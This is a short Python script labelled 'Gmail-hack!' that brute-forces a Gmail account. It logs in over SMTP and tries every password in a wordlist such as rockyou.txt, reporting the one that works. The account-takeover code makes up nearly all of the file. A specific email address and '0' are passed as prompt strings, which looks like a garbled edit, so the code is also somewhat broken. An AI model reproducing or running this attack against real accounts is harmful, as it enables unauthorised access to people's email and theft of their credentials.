import smtplib
import sys
from os import system
def artwork():
    print("\n")
    print("##########################################################")
    print("#                                                        #")
    print("#                     \||/                               #")
    print("#                     |  @___oo                          #")
    print("#           /\  /\   / (__,,,,|                          #")
    print("#          ) /^\) ^\/ _)                Gmail-hack!      #")
    print("#          )   /^\/   _)                CoDeD By:        #")
    print("#          )   _ /  / _)                        d4az     #")
    print("#      /\  )/\/ ||  | )_)                                #")
    print("#     <  >      |(,,) )__)                               #")
    print("#      ||      /    \)___)\                              #")
    print("#      | \____(      )___) )___                          #")
    print("#      \______(_______;;; __;;;                          #")
    print("#                                                        #")
    print("##########################################################")
    print("\n")
    
    
artwork()
smtpserver = smtplib.SMTP("smtp.gmail.com", 587)

smtpserver.ehlo()
smtpserver.starttls()

user = input("atollybabe44@gmail.com")

print("rockyou.txt")

pwd = input("0")

if pwd=='0':
    passswfile="rockyou.txt"

elif pwd=='2':
    print("\n")
    passswfile = input("Name The File Path (For Password List) => ")

else:
    print("\n")
    print("Invalid input!")
    sys.exit(1)
try:
    passswfile = open(passswfile, "r")

except Exception as e:
    print(e)
    sys.exit(1)

for password in passswfile:
    try:
        smtpserver.login(user, password)

        print("[+] Password Found %s" % password)
        break

    except smtplib.SMTPAuthenticationError:
        print("[!] Pasword Is Wrong. %s " % password)

